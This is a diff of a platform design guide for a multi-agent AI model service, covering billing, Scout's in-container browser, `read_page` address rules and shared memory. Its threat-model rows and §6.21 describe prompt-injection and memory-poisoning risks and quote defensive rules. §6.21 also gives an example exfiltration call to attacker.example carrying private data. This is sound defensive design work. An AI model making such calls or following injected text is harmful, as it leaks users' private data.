@@ -2,7 +2,7 @@
 
 What the MVP had to do, how it was designed, what we built, the tech used, and how every part works.
 
-- **Date:** 2026-09-28. **Updated:** 2026-10-03 with the launch basics (`docs/launch-plan.md`, package W1a), and 2026-10-04 with the crew package (W2b-1): the crew list and progress lines, pull-request review, Scout's `web_search` and `read_page`, choosing Textcrew AI, and browser time split from paid tools in usage. Then, the same day, shared memory (W3a): one memory on the platform for every engine, the `remember`, `recall` and `forget` tools, what is known about the user at the top of every delivered turn, a recap of the chat when the engine changes, and the memory endpoints. Then the search and browser decisions of 2026-10-04: `web_search` is part of the Max plan and costs 1 credit a search, an engine's own web search is used first and is free, and the browser will allow logins (design only)
+- **Date:** 2026-09-28. **Updated:** 2026-10-03 with the launch basics (`docs/launch-plan.md`, package W1a), and 2026-10-04 with the crew package (W2b-1): the crew list and progress lines, pull-request review, Scout's `web_search` and `read_page`, choosing Textcrew AI, and browser time split from paid tools in usage. Then, the same day, shared memory (W3a): one memory on the platform for every engine, the `remember`, `recall` and `forget` tools, what is known about the user at the top of every delivered turn, a recap of the chat when the engine changes, and the memory endpoints. Then the search and browser decisions of 2026-10-04: `web_search` is part of the Max plan and costs 1 credit a search, an engine's own web search is used first and is free, and the browser will allow logins (design only). Then Scout's browser, first version (W2c, platform side): the browser runs inside the user's container, the platform switches it on for Max and off for everyone else, browser time is charged at 2 credits per minute, `read_page` opens any public address on Claude Code, and the dev script can run a whole turn from the command line
 - **Code:** branch `mvp-build` in `beckend/` (TypeScript api + worker) and `vm-manager/` (Go + the agent image)
 - **Design source:** `docs/mvp-hld.md`
 - **Contracts:** `openapi/openapi.yaml` (REST + webhooks), `../vm-manager/proto/vm/v1/vm.proto` (gRPC)
@@ -29,11 +29,11 @@ What the MVP had to do, how it was designed, what we built, the tech used, and h
 
 | | |
 |---|---|
-| **Build phases (HLD §9)** | All 8 coded and committed (0 foundations → 8 hardening), plus later changes: a waitlist API, the 2026-09-29 pricing update (Max $30, automations 1/5/50, 90-day credits, waitlist discount), bring your own Claude plan (Claude Code runtime, 2026-09-30), and the **launch basics of 2026-10-03**: the channels switch (Telegram and web on, WhatsApp and iMessage off), 1 credit per app action that changes something, the connection check job, no purchase links on Telegram, and `/mcp` and `/git` closed at Caddy (§11). Then the **crew package of 2026-10-04**: the crew list, crew progress lines in web chat, pull-request review per repo, Scout's `web_search` and `read_page`, choosing Textcrew AI over an own key or Claude plan, browser time as its own usage number, browser use in Max's features (§6.19 to §6.21). Then **shared memory of 2026-10-04**: a memory on the platform that every engine shares, three tools to save, find and correct it, the memory block on every delivered turn, a recap of the chat when the engine changes, and endpoints for the user to see and delete it (§6.22) |
-| **Backend tests** | 38 files, 396 tests, all passing (run on 2026-10-04): real Postgres + real Redis, fakes for outside services |
+| **Build phases (HLD §9)** | All 8 coded and committed (0 foundations → 8 hardening), plus later changes: a waitlist API, the 2026-09-29 pricing update (Max $30, automations 1/5/50, 90-day credits, waitlist discount), bring your own Claude plan (Claude Code runtime, 2026-09-30), and the **launch basics of 2026-10-03**: the channels switch (Telegram and web on, WhatsApp and iMessage off), 1 credit per app action that changes something, the connection check job, no purchase links on Telegram, and `/mcp` and `/git` closed at Caddy (§11). Then the **crew package of 2026-10-04**: the crew list, crew progress lines in web chat, pull-request review per repo, Scout's `web_search` and `read_page`, choosing Textcrew AI over an own key or Claude plan, browser time as its own usage number, browser use in Max's features (§6.19 to §6.21). Then **shared memory of 2026-10-04**: a memory on the platform that every engine shares, three tools to save, find and correct it, the memory block on every delivered turn, a recap of the chat when the engine changes, and endpoints for the user to see and delete it (§6.22). Then **Scout's browser, the platform side, of 2026-10-04**: the switch by plan through the vm-manager's new `SetBrowser`, the setting `BROWSER_AVAILABLE`, browser time held to 2 credits per minute by tests, the crew list's `browser.enabled`, `read_page` by engine, and the dev script's `send` and its helpers (§6.21, §6.23, §6.24) |
+| **Backend tests** | 39 files, 436 tests, all passing (run on 2026-10-04): real Postgres + real Redis, fakes for outside services |
 | **vm-manager tests** | Go unit tests (fake Docker daemon, store on embedded Postgres, `-race` clean) + 87 Bridge (Python) tests with a fake Hermes and a fake `claude` CLI. The numbers are from the agent-image package (W2b-2, 2026-10-04); they were not re-run for this guide |
 | **Contract coverage** | Every operation in `openapi.yaml` is implemented (a test enforces it) |
-| **Run for real?** | **Partly.** Docker isn't installed on the dev machine. A test deployment ran on AWS on 2026-09-30 and 2026-10-01 (`docs/aws-setup.md`): Telegram, Claude Code on a Claude plan, Composio, Caddy and Squid ran for real. That server is stopped now. The launch basics of 2026-10-03, the crew package and shared memory of 2026-10-04 have not run there, and WhatsApp, Sendblue, Polar, Jev and a platform model key have never run for real |
+| **Run for real?** | **Partly.** Docker isn't installed on the dev machine. A test deployment ran on AWS on 2026-09-30 and 2026-10-01 (`docs/aws-setup.md`): Telegram, Claude Code on a Claude plan, Composio, Caddy and Squid ran for real. The crew ran on that server again on 2026-10-04: Scout searched with Claude Code's built-in search and `read_page` refused every result, which is why its rule now differs by engine (§6.21). The browser switch, browser charging and the new `read_page` rule have not run there, and WhatsApp, Sendblue, Polar, Jev and a platform model key have never run for real |
 | **Verdict** | **Code-complete, not end-to-end verified.** Section 12 lists the steps to verify it on a Docker machine |
 
 ---
@@ -52,7 +52,7 @@ This is what HLD sections 0, 5 and 7 ask the product to do.
 | F4 | **Real work in apps** | About 25 apps through Composio, plus the user's own MCP servers (Max plan) |
 | F5 | **Ask before risky actions** | Approvals for sending to others, deleting, paying; they never block the agent (✅/❌ comes back later as a new message) |
 | F6 | **Reminders and automations** | Once ("Friday 10am"), repeating ("every Monday 9am", in the user's timezone), app events ("when my boss emails me"); at most every 15 minutes |
-| F7 | **Credits billing** | 1 credit = $0.01 of price at ~2.5× real cost; AI, awake time, app actions that change something (1 credit each, since 2026-10-03), browser use and web search through Textcrew (1 credit per search, on the Max plan, since 2026-10-04) cost credits; reading and searching in apps are free, reading a web page is free, and the web search built into the user's own engine costs nothing; failed turns caused by us are free. Browser use is planned for launch on the Max plan and is not built yet |
+| F7 | **Credits billing** | 1 credit = $0.01 of price at ~2.5× real cost; AI, awake time, app actions that change something (1 credit each, since 2026-10-03), browser use and web search through Textcrew (1 credit per search, on the Max plan, since 2026-10-04) cost credits; reading and searching in apps are free, reading a web page is free, and the web search built into the user's own engine costs nothing; failed turns caused by us are free. Browser use is 2 credits per minute of browser time, on the Max plan (§6.23) |
 | F8 | **Plans** (updated 2026-09-29 to match the pricing page) | Free $0 (100 sign-up credits, 10 apps, 1 automation), Pro $12 (1,500/month, 25 apps, 5 automations, top-ups), Max $30 (4,500/month, 25 apps + own MCP servers, 50 automations, priority when things get busy). **Every credit lasts 90 days from its grant**, whatever the source; unused monthly credits carry over. Model tiers are no longer advertised; the model limits stay in code and apply to Textcrew AI (F11) |
 | F9 | **Payments** | Polar checkout for plans and top-ups ($10 = 800 credits); webhooks decide plan changes; refunds and chargebacks; waitlist members get 50% off their first month of Pro or Max |
 | F10 | **Coupon codes** | Admin-created free credits with strict anti-abuse rules (HLD 7.7) |
@@ -63,7 +63,7 @@ This is what HLD sections 0, 5 and 7 ask the product to do.
 | F15 | **Admin** | Coupons, credit adjustments, free-credit spend, abuse flags, failed jobs (Bull Board) |
 | F16 | **The crew** (2026-10-03) | Tex leads; Byte codes, Patch reviews code, Scout researches. The specialists are defined in the agent image. The platform gives the apps the crew list and passes the crew's progress lines to web chat |
 | F17 | **Pull-request review** (2026-10-03) | Turned on per GitHub repo. A pull request is opened or gets new commits → Patch reviews it → one review on the pull request → a short verdict in chat. Once per head commit. Turning it on is the standing permission to comment on that repo's pull requests, and nothing else |
-| F18 | **Web research** (2026-10-03, plan and price decided 2026-10-04) | Only Scout searches. An engine with its own web search (Claude Code on the user's Claude plan) uses that, free on every plan. Otherwise `web_search` through Textcrew (Brave): Max plan only, 1 credit per search. `read_page` is free on every plan. Both platform tools run on the platform, never in the container. `read_page` reaches public addresses only, and only an address already seen for the user |
+| F18 | **Web research** (2026-10-03, plan and price decided 2026-10-04) | Only Scout searches. An engine with its own web search (Claude Code on the user's Claude plan) uses that, free on every plan. Otherwise `web_search` through Textcrew (Brave): Max plan only, 1 credit per search. `read_page` is free on every plan. Both platform tools run on the platform, never in the container. `read_page` reaches public addresses only. On Hermes it opens only an address already seen for the user; on Claude Code any public address (decided 2026-10-04, §6.21) |
 | F19 | **Shared memory** (2026-10-04) | One memory on the platform, the same whichever engine runs: short facts the agent saves about the user. It reaches every turn; a new engine also gets a recap of the chat; the user can see and delete it. The engines' own memory in `/data` is left as it is |
 
 ### 2.2 Non-functional requirements
@@ -163,9 +163,11 @@ Rule: each module owns its tables and other modules use its exported functions, 
 |---|---|---|
 | edge | Caddy, api | only Caddy is exposed (80/443) |
 | platform | api, worker, vm-manager, Postgres, Redis, LiteLLM, egress proxy | outbound only (see §11) |
-| sandbox (internal) | user containers, egress proxy, vm-manager | none; the proxy is the only way out |
+| sandbox (internal) | user containers, egress proxy, vm-manager | none; the proxy is the only way out. It lets every container reach LiteLLM, the api's `/mcp` and `/git/` and the user's own MCP domains, and **a container with Scout's browser on any public website** (Max plan, since 2026-10-04) |
 
 `/mcp` and `/git` are not reachable from the internet: Caddy answers 404 for `/mcp*` and `/git/*`. Containers reach the api directly on the platform network through the egress proxy, never through Caddy.
+
+**The open way out** (HLD §4, §10.3). Scout's browser runs inside the user's container, so a container the platform switched the browser on for can reach any public website. Private, loopback, link-local, metadata and internal addresses stay refused; that part is the vm-manager's and the proxy's. Every other container stays locked. What the open network costs is in §6.18 and HLD §10.3.
 
 ---
 
@@ -267,9 +269,10 @@ Status: ✅ built + tested (fakes for outside services) · ⚠️ built, needs a
 | F13 Media | Download per channel, voice → text via LiteLLM | ✅ / ⚠️ |
 | F14 Web API | All 63 operations in the spec | ✅ |
 | F15 Admin | Coupons, credit adjustments, free-credit stats + abuse flags, Bull Board, waitlist admin | ✅ |
-| F16 The crew | `GET /v1/crew` (Tex, Byte, Patch, Scout; `CREW_AVAILABLE` says which specialists are on; Scout's browser needs Max and is not built). Progress lines → SSE `agent.progress`, crew lines also in the activity log, nothing to Telegram | ✅ / ⚠️ never run against the real Bridge |
+| F16 The crew | `GET /v1/crew` (Tex, Byte, Patch, Scout; `CREW_AVAILABLE` says which specialists are on; Scout's browser needs Max, `BROWSER_AVAILABLE` says whether the deployment has it, and `enabled` whether it is on for this user). Progress lines → SSE `agent.progress`, crew lines also in the activity log, nothing to Telegram | ✅ / ⚠️ never run against the real Bridge |
 | F17 Pull-request review | `PUT` / `DELETE /v1/pr-reviews/{owner}/{repo}`, `GET /v1/pr-reviews`; an event automation with the preset `pr_review`; one review per head commit (`pr_reviews`); a standing approval for four named GitHub actions on that repo | ✅ / ⚠️ real Composio trigger and action names |
-| F18 Web research | `web_search` behind a provider interface (Brave built), Max plan only (a tool error on Free and Pro), 1 credit a search through the ledger; `read_page` with address checks at every hop, a pinned connection, limits, and the seen-address rule | ✅ / ⚠️ no search key yet, never run against the real internet |
+| F18 Web research | `web_search` behind a provider interface (Brave built), Max plan only (a tool error on Free and Pro), 1 credit a search through the ledger; `read_page` with address checks at every hop, a pinned connection, limits, the seen-address rule on Hermes and any public address on Claude Code | ✅ / ⚠️ no search key yet; the new rule has not run on the server |
+| F19 Scout's browser (platform side) | The switch by plan (`CreateSandbox.browser_enabled`, the `sync-browser` job, the check after a wake), `BROWSER_AVAILABLE`, browser seconds charged at 2 credits per minute, the crew list's `browser` | ✅ / ⚠️ never run against the real vm-manager or a container with a browser |
 | F19 Shared memory | `remember`, `recall` and `forget` on the Platform MCP; `memories` in Postgres, found with its text search; a memory block at the top of every delivered turn; `chat_engines` and a recap when the engine changes; `GET` and `DELETE /v1/memories`; obvious secrets refused; no memory text in the audit log | ✅ / ⚠️ never run against a real engine |
 | N1 Isolation | gVisor spec, limits, read-only, sandbox network, Squid allowlist | ⚠️ (no disk quota by default 🔁) |
 | N2 No impersonation | `/mcp` maps sha256(token) → user; tools never read a user id | ✅ |
@@ -324,6 +327,7 @@ worker ──▶ take the user's Redis lock (inbound queue) ──▶ handler �
 | **Redis lost** | On worker start: re-queue every event from the last 7 days still `received`/`queued`, and re-register every enabled automation from Postgres |
 | **Repeating system jobs** | sync-usage (5 min), expire-credits (hourly), expire-approvals (hourly), health-check (5 min), cleanup (03:30), backup (02:00) |
 | **Delayed system job** | check-connection: six checks of a new app connection over about 16 minutes (§6.8) |
+| **System jobs added on a change** | sync-allowlist (the user's MCP servers changed, §6.9), sync-browser (the user's plan changed: Scout's browser on or off, §6.23). Both work the state out again from the database each time they run |
 
 ### 6.3 Sign-up and onboarding
 
@@ -424,7 +428,7 @@ Step by step (`orchestrator/process-message.ts` → `turn.ts`):
 10. **Inside the container**, the Bridge runs one Hermes turn in that chat's session. Hermes calls the Platform MCP tools. The Bridge sends the final answer itself through `send_message`.
 11. **After the turn**, usage is synced for this user (§6.10), then SSE sends `credits.updated` and the lock is released.
 
-**Web messages** skip the webhook. `POST /v1/messages` returns `402` at zero credits, allows 30 per minute and is idempotent on `clientMessageId`. It saves the message, adds the event and job `web-message`, and the reply comes back over SSE (`GET /v1/stream`, with the token in the query string because browsers can't set headers on EventSource).
+**Web messages** skip the webhook. `POST /v1/messages` returns `402` at zero credits, allows 30 per minute and is idempotent on `clientMessageId`. It saves the message, adds the event and job `web-message`, and the reply comes back over SSE (`GET /v1/stream`, with the token in the query string because browsers can't set headers on EventSource). Since 2026-10-04 the checks, the save and the job are one function, `sendWebMessage` (`orchestrator/process-message.ts`), which the dev script's `send` calls too (§6.24).
 
 ### 6.6 Sending replies (outbound)
 
@@ -523,7 +527,7 @@ The 14 tools are listed in §8.3.
 4. Credits:
    - AI: cost × 2.5 × 100, rounded up
    - awake time: 1 credit per 600 s
-   - browser time: 1 credit per 30 s (browser use is planned for launch on the Max plan and is not built yet, so this is always 0 today). Since 2026-10-04 it is saved as its own number (`usage_periods.browser_credits`); before, it shared `tool_credits` with paid tools
+   - browser time: 1 credit per 30 s, which is 2 credits per minute (Scout's browser, Max plan, §6.23). The vm-manager reports the seconds the browser was in use. Since 2026-10-04 it is saved as its own number (`usage_periods.browser_credits`); before, it shared `tool_credits` with paid tools
    - leftover seconds carry over to the next sync
 5. The result is **one** charge with the key `usage:<user>:<period start>`, so a re-run can't charge twice. A window with no usage writes nothing.
 6. BYOK users aren't charged for AI; awake time still counts. A BYOK user who chose Textcrew AI (`aiPreference: platform`, §6.13) is charged for AI like anyone else.
@@ -794,7 +798,8 @@ We follow Anthropic's rules (code.claude.com/docs/en/legal-and-compliance). The 
 | The pull-request review permission used for something else | It covers four GitHub actions by exact name, on a repo the user turned review on for, and never an approval, a merge or a reply. The agent can't turn review on (§6.20) |
 | A pull request's text steering the agent | The review instruction carries no text from the pull request and says to treat it as material, never instructions. Risky actions still need approval |
 | `read_page` used to reach our own services or the cloud metadata address | Public addresses only, checked on the URL, on what the host resolves to, at every redirect, and the connection is pinned to the checked address (§6.21) |
-| `read_page` used to send the user's data out | It opens only an address already seen for this user (their own messages, a search result, a link on a page already read), at every redirect too. A made-up address is refused and logged (§6.21) |
+| `read_page` used to send the user's data out | **On Hermes:** it opens only an address already seen for this user (their own messages, a search result, a link on a page already read), at every redirect too. A made-up address is refused and logged. **On Claude Code** it opens any public address (decided 2026-10-04): there the agent image lets only Scout call it, and Scout has no files, no shell and no app tools. The platform can't check which agent calls, so an agent with a shell that reads the container's token can call `/mcp` itself: limited to one GET at a time, 30 a minute, each in the activity log, and not closed (§6.21, HLD §10.3) |
+| A Max user's container with the browser on sending the user's data out | **Not prevented.** That container can reach any public website, and it holds the user's files, cloned code, the engine's memory, git access and the Claude sign-in. What limits the damage: one user per container; Composio, provider, database and GitHub keys are never in it; approvals still hold; the container's own tokens work only inside our networks; internal addresses stay refused; only Max containers are opened, and only while `BROWSER_AVAILABLE` is on. What doesn't: nothing checks where the container connects, the whole container has the open network (a shell too), and a copied Claude sign-in works anywhere (HLD §10.3) |
 | A web page steering the agent | The tools say that text from the web is information, never instructions. Scout has only the two web tools on Claude Code; on Hermes that limit is an instruction, so the platform checks above are what counts (§6.19) |
 | A memory passing for the user's message or for the platform | A memory is one line: line breaks and control characters become spaces when it is saved and again when the block is built, and square brackets are turned round. Only the platform writes the block's first line, its end line and the "this turn's message follows" line. The block says its notes are data and can never approve an action (§6.22) |
 | Something the agent read getting a false "fact" saved (memory poisoning) | Limited, not solved: the tool says to save only what the user said themself; every save is in the activity log; the user sees and deletes memories in the web app; risky actions still need approval; 200 memories and 60 changes an hour. The platform can't check that the user really said it (§6.22) |
@@ -818,13 +823,13 @@ The per-item checklist (HLD 10.2) is in `docs/security-checklist.md`.
 - **Where they live:** in the Bridge inside the agent image (`vm-manager`), defined once for both engines. The backend only knows what is below. No change to the gRPC proto.
 - **The crew list** (`GET /v1/crew`, `orchestrator/crew.ts`): the four members with id, name, `kind` (`lead` or `specialist`), role, a short description and `available`.
   - `available`: Tex always. A specialist when it is named in `CREW_AVAILABLE` (default `byte,patch,scout`; `none` switches all three off). The backend can't see which image is deployed, so this setting says what the apps may show.
-  - Scout also carries `browser: { requiresPlan, available }`. `requiresPlan` comes from the plans (the plan whose limits have `browser: true`, which is Max). `available` is false: the browser is not built.
+  - Scout also carries `browser: { requiresPlan, available, enabled }`. `requiresPlan` comes from the plans (the plan whose limits have `browser: true`, which is Max). `available` is the setting `BROWSER_AVAILABLE` (off by default): whether the deployed agent image has the browser. `enabled` is whether it is on for the signed-in user: available, and their plan includes it (§6.23). `listCrew` takes the user's plan for this.
   - Scout's description says what needs Max and what doesn't: web search through Textcrew and the real browser need it; the search built into the user's own Claude plan works on any plan and costs no credits.
 - **Progress lines** (`orchestrator/turn.ts`): the Bridge reports progress during a turn as stream events with a text, for example `Scout: reading 4 pages` or `using web_search`.
   - Every line goes to the web app's live stream as `agent.progress` (`text`, `crew`, `at`). `crew` is `byte`, `patch` or `scout` when the text starts with that name and a colon, otherwise null.
   - **Nothing is sent to Telegram** or any other chat for a progress line. A chat only gets what the agent sends with `send_message`.
   - A line that names a crew member is also saved to the activity log (`crew_progress`, with `crew`), at most 30 per turn. A line is cut at 300 characters. A failure here never fails the turn.
-- **Known limit on Hermes** (from the agent-image package): the pinned Hermes version has no tool list per delegated task. On Claude Code a specialist's tool list is enforced; on Hermes it is only an instruction. So Scout's "search and read only" holds by tools on Claude Code and by instruction on Hermes. The controls that hold on both engines are on the platform: approvals, and the seen-address rule of `read_page` (§6.21).
+- **Known limit on Hermes** (from the agent-image package): the pinned Hermes version has no tool list per delegated task. On Claude Code a specialist's tool list is enforced; on Hermes it is only an instruction. So Scout's "search and read only" holds by tools on Claude Code and by instruction on Hermes. Approvals hold on both engines. The seen-address rule of `read_page` holds on Hermes; on Claude Code it was given up for the tool lists (§6.21).
 
 ### 6.20 Pull-request review (2026-10-03, HLD §0.8)
 
@@ -855,7 +860,7 @@ Everything else still needs approval, in the same turn too: merging, a comment o
 
 ### 6.21 Scout's tools: `web_search` and `read_page` (2026-10-04, HLD §5.1)
 
-Both run in the api. The container's network stays locked and no provider key enters it.
+Both run in the api. They need no way out of the container, and no provider key enters it.
 
 **Who searches, and with what** (decided 2026-10-04, HLD §0.7). Only Scout searches the web. When the user's engine has its own web search (Claude Code on the user's Claude plan today; Codex later), Scout uses that: the platform is not involved, it costs no credits and it works on every plan. Otherwise Scout uses the platform's `web_search`. The agent image decides which one Scout is given, and who may call it; the platform can't tell the crew members apart (one container token) and doesn't check the engine.
 
@@ -878,7 +883,22 @@ Both run in the api. The container's network stays locked and no provider key en
 - **Limits:** 15 seconds in total; 2 MB; text types only (HTML, plain text, JSON, XML); 20,000 characters returned. The text extraction is one pass with no backtracking.
 - **What is sent:** a plain GET with a fixed user agent. No cookies, nothing about the user.
 
-**The seen-address rule** (`platform-mcp/seen-urls.ts`). `read_page` needs no approval, so it must not be a way to send data out: an injected instruction could otherwise make an agent call `read_page("https://attacker.example/?d=<private data>")`. So it opens only an address the platform has already seen for this user, by exact match after normalising:
+**Which addresses `read_page` opens depends on the engine** (decided 2026-10-04, `platform-mcp/tools/web.ts`):
+
+| The turn runs on | `read_page` opens |
+|---|---|
+| Claude Code | Any public address, and any redirect that passes the address checks |
+| Hermes, or no turn on record | Only an address already seen for the user (below) |
+
+- **Why:** on the server, Scout searched with Claude Code's built-in search and `read_page` refused every result (`read_page_refused`). Those results never pass through the platform, so none was a "seen" address.
+- **Why Claude Code can be open:** the agent image lets only Scout call `read_page` there, and Scout has no files, no shell and no app tools. Hermes can't narrow tools per agent, so it keeps the strict rule.
+- **How the engine is known** (`orchestrator/turn.ts`): `runTurn` records the engine the turn really runs on (what `syncRuntimeAfterWake` returns) in Redis as `turn-engine:<user>` just before it delivers, for 20 minutes at most, and removes it when the turn ends, however it ends. `read_page` reads it with `turnEngine(userId)`. No record, or Redis can't be read: the strict rule. A turn that was running on Hermes when the user connected their Claude plan stays strict; so does a turn whose container could not be switched.
+- **The address checks are the same on both:** private, loopback, link-local, metadata and internal addresses are refused, on the URL, on what the host resolves to and at every redirect.
+- **The tool's description** is one text for both engines. It no longer says that only seen addresses can be read (that would stop Scout on Claude Code from reading its own search results); it says some engines refuse an unseen address, and the refusal says what to do.
+- **In the activity log** a page read at an address that had not been seen carries `seen: false` in the entry's details.
+- **What this gives up** is in HLD §10.3: the platform trusts the agent image for "only Scout", and an agent with a shell can call `/mcp` itself with the container's token.
+
+**The seen-address rule** (`platform-mcp/seen-urls.ts`), on Hermes and whenever no Claude Code turn is on record. `read_page` needs no approval, so it must not be a way to send data out: an injected instruction could otherwise make an agent call `read_page("https://attacker.example/?d=<private data>")`. So it opens only an address the platform has already seen for this user, by exact match after normalising:
 - **(a)** an address in the user's own messages (their last 100 from the past 7 days, on any chat). The agent's own messages, automation instructions and app events don't count;
 - **(b)** a result of `web_search`;
 - **(c)** a link on a page `read_page` already returned.
@@ -928,6 +948,51 @@ Both run in the api. The container's network stays locked and no provider key en
 **The user's control** (`api/routes/memories.ts`): `GET /v1/memories` (all of them, newest first, with `max`), `DELETE /v1/memories/{memoryId}`, `DELETE /v1/memories` (answers how many). There is no endpoint to add or edit one. Each delete is in the activity log, without the text. The *delete-user* job removes the memories and the `chat_engines` rows.
 
 **Security, in short:** a memory is data and nothing on the platform reads one to decide what is allowed; text in a memory or in a recap can't write the platform's own lines; an address in a memory is not a "seen" address for `read_page`; memories never cross users. **Not solved:** the platform can't check that the user really said a fact, so an agent that follows an injected instruction can save a false one, and it stays until the user deletes it. On Hermes, Scout can reach `remember` (its tool list is only an instruction). Memory can be written in a turn the user didn't start (an app event, a pull-request review).
+
+### 6.23 Scout's browser: the platform's side (2026-10-04, HLD §11)
+
+The browser runs **inside the user's own container**. The agent image carries it and the vm-manager switches it on per container; both are in the `vm-manager` repo. The earlier plan (a hosted browser at Browserbase driven by six platform tools) is cancelled: there is no `browser_*` tool on the Platform MCP and no provider. This repo decides who has the browser, tells the vm-manager, charges the time and tells the apps.
+
+**Who has it** (`orchestrator/browser.ts`, `browserWanted(plan)`). Both must hold:
+- the plan includes it: Max (`limits.browser`, plugged in through `wiring.ts`; until it is plugged in, no plan has it);
+- `BROWSER_AVAILABLE` is on. The backend can't see which agent image is deployed, so this setting says the image has the browser. It is **off by default**: until it is on, no container's browser is switched on, whatever the plan.
+
+**Telling the vm-manager.** The wanted state is sent (on or off), never "flip it", so each of these can be repeated:
+
+| When | How |
+|---|---|
+| A container is created | `CreateSandbox` carries `browser_enabled` (`orchestrator/sandbox.ts`) |
+| The plan changes | `auth.setPlan` now answers whether the plan changed. Billing fires `onPlanChanged` after its transaction: a new subscription, `subscription.updated` with another product, and a subscription ending (`polar-events.ts`, `subscriptions.ts`). A renewal of the same plan fires nothing. `wiring.ts` adds a **`system/sync-browser`** job. The job reads the plan again, asks `GetSandbox` what is on record and calls `SetBrowser` only when it differs. No container yet: nothing to do. vm-manager down: the job fails and is retried like any job |
+| After every wake | `syncBrowserAfterWake` (`orchestrator/turn.ts`) compares `browser_enabled` of the woken sandbox with the rule and sends `SetBrowser` on a difference. This catches a job that ran out of tries, a container made before the browser existed, and a change of the setting. It never fails the turn |
+
+- **It takes effect on the container's next wake** (the vm-manager's rule). A user who upgrades while awake has the browser after the container has stopped and woken again; a user who leaves Max keeps it until then, and pays for those minutes.
+- **Every switch is in the activity log:** `browser_enabled` and `browser_disabled`, actor `system`.
+- The dev script sets a plan directly, so `create` sends the switch itself and `browser --user` sends it for any user (§6.24).
+
+**Money.** No code was missing: the usage sync already read `browser_seconds` from `GetUsage`, which was always 0. Tests now hold it to the price (`test/phase5-usage.test.ts`): 30 seconds is 1 credit, part minutes carry over between syncs, a window is charged once however often the sync runs (the same window in parallel, again, a later window, the 5-minute job), a period shows `browserSeconds` and `browserCredits` in `GET /v1/usage` and `Usage: …, browser N` in the credit history, and a turn reversed as our fault gives the browser credits back. A user at zero credits is not woken (`test/browser.test.ts`). Inside a turn the browser is not cut off; a turn lasts 15 minutes at most.
+
+**What the apps are told:** `GET /v1/crew` → Scout's `browser: { requiresPlan: "max", available, enabled }`; `GET /v1/billing/plans` → `limits.browser` and the line "Browser use: 2 credits per minute" on Max only; `GET /v1/usage` → `browserSeconds`, `browserCredits`.
+
+**Not in this version:** signing in to sites (HLD §11.6: it needs a way for the user to see the browser), any view of the browser for the user, and any check of where the browser goes.
+
+**What it opens.** A container with the browser on can reach any public website, and so can everything else in it. HLD §10.3 says plainly what that leaves open and what still limits the damage; §6.18 has the short form.
+
+### 6.24 The dev script: a turn from the command line (2026-10-04)
+
+`scripts/dev-user.ts` runs inside the api container (`node --import tsx scripts/dev-user.ts <command>`) and uses the same module functions as the api and the worker. Since 2026-10-04 it can run and inspect a whole turn with no Telegram and no web app:
+
+| Command | What it does |
+|---|---|
+| `send --user <id> --text <text> [--timeout 900]` | Sends a message in **web chat** through `sendWebMessage`, the function `POST /v1/messages` itself calls (channel on, 30 a minute, refused at zero credits, saved once, the `web-message` job). The worker runs the turn. The script listens to the user's live stream, waits for the job to end and prints `sent <message id>`, a `progress …` line per progress line, a `reply …` per message the agent sent (and `approval <id> is waiting…` when one asks for approval), `turn done after N s`, the message's status and the balance. After `--timeout` seconds it says the turn is still running |
+| `messages --user <id> [--limit 10]` | The latest messages, oldest first: time, `user` or `agent`, channel, status, text |
+| `activity --user <id> [--limit 20]` | The latest activity entries, oldest first: time, actor, action, `crew=…`, `credits=…`, summary |
+| `approve --user <id> [--approval <id>] [--decision approve\|reject] [--timeout 900]` | Answers a pending approval as the web app does (`decideApproval`, via `dev-script`), then follows the agent's next turn like `send`. Without `--approval` it takes the pending one; with none or several it says so |
+| `pr-review --user <id> [--repo <owner>/<name> --state on\|off]` | Turns pull-request review on or off for a repo (`enablePrReview`, `disablePrReview`) and lists what is on. With only `--user` it lists |
+| `memories --user <id> [--clear all\|<memoryId>]` | Lists the shared memory; deletes one or all (in the activity log as `memory_deleted` / `memories_cleared`, actor `admin`) |
+| `browser --user <id>` | Sends Scout's browser switch for the user now and prints the state. `create` and `status` print the same line: `browser on\|off\|unknown (should be on\|off; the image has it: yes\|no)` |
+
+- **It never prints a secret.** No key, token or sign-in code is read for printing. Text that people or the agent wrote (messages, replies, progress lines, approval and activity summaries, memories) goes through `hideSecrets` (`orchestrator/memory-secrets.ts`): known key and token shapes, a web address with a password or a token, the value after a secret word, card numbers, and long random runs are replaced by `[hidden]`. A plain hash (a commit id) and a long id inside a web address are left readable.
+- `sendWebMessage` (`orchestrator/process-message.ts`) is new: the route's checks, save and job moved into it unchanged, so the script and the web app share one path.
 
 ---
 
@@ -1017,7 +1082,7 @@ Auth: **public** = no token · **user** = Clerk session · **admin** = Clerk ses
 | agent | `GET /v1/agent/status` | user | Container state |
 | agent | `GET /v1/agent/settings` | user | Which agent runs (`runtime`, `effectiveRuntime`), what pays (`aiAccess`), whether Textcrew AI is on offer (`platformAvailable`) and chosen (`aiPreference`), Claude plan status, own-key providers |
 | agent | `PATCH /v1/agent/settings` | user | `runtime`, `aiPreference` or both: choose Hermes or Claude Code (`409` without a connected Claude plan), or choose Textcrew AI (`409` when it isn't on offer) |
-| agent | `GET /v1/crew` | user | The crew: Tex and the three specialists, whether each is available, and Scout's browser (needs Max, not built) |
+| agent | `GET /v1/crew` | user | The crew: Tex and the three specialists, whether each is available, and Scout's browser (`requiresPlan` Max, `available` on this deployment, `enabled` for this user) |
 | agent | `POST /v1/agent/claude/login` | user | Start the Claude Code sign-in in the container; returns Anthropic's URL (10/hour, `503` if unavailable) |
 | agent | `POST /v1/agent/claude/login/{loginId}/complete` | user | Hand over the code from Anthropic's page (`400` wrong/expired, `404` unknown) |
 | agent | `DELETE /v1/agent/claude` | user | Sign Claude Code out; back to Hermes |
@@ -1069,7 +1134,7 @@ The Telegram, WhatsApp and Sendblue webhooks answer 200 and save nothing while t
 | `get_profile` | – | Name, timezone, plan, connected apps |
 | `list_app_actions` | app?, search? | Actions of connected apps allowed on the plan, with `requires_approval` and `costs_credits` |
 | `web_search` | query, count? | Titles, links and snippets from the search provider. Max plan only: a tool error on Free and Pro. 1 credit per search (`credits_charged` in the result). Says so when search isn't set up |
-| `read_page` | url | The text and links of one public web page. Only an address already seen for the user. Free, on every plan |
+| `read_page` | url | The text and links of one public web page. On Claude Code any public address; on Hermes only an address already seen for the user. Free, on every plan |
 | `remember` | content, kind? | Saves one short fact about the user to the shared memory. Refused: a secret, more than 300 characters, more than 200 memories. Free |
 | `recall` | query?, limit? | The memories that fit a question, best match first; with no query, the latest. Free |
 | `forget` | memory_id, correction? | Removes a memory, or corrects its text and keeps its id. Free |
@@ -1084,13 +1149,13 @@ The Telegram, WhatsApp and Sendblue webhooks answer 200 and save nothing while t
 
